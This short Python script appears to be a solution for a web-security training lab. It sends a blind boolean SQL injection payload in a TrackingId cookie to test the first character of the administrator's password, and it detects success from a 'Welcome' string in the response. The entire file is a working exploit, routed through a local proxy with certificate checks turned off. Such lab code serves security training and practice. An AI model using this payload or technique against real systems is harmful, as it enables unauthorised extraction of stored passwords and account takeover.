import requests
import urllib3
import urllib

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

sqli_payload = "' and (select ascii(substring(password,1,1)) from users where username='administrator')='99'--"
cookies = {'TrackingId': 'zYtDKI2pkC1tF1Sd' + sqli_payload, 'session': 'ED4hwPlSHj8gD6npx3PgXiE32QkAAreX'}
r = requests.get("https://ac031f031f81eb56c027681100b400d5.web-security-academy.net/", cookies=cookies, verify=False, proxies=proxies)

if "Welcome" not in r.text:
    print("Nope")
else:
    print("Yes")